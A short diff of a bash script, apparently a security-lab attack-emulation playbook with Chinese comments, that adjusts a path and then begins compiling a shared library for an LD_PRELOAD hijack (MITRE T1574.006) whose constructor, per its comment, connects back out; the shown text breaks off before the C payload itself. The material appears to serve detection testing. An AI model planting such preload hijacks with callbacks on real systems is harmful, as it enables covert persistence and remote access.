@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
 set -euo pipefail
-HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
 # T1574.006：.so 写入 + LD_PRELOAD 劫持合法程序（构造函数回连）
 cc -O2 -Wall -shared -fPIC -o libpreload.so -x c - <<'EC'
 #include <arpa/inet.h>
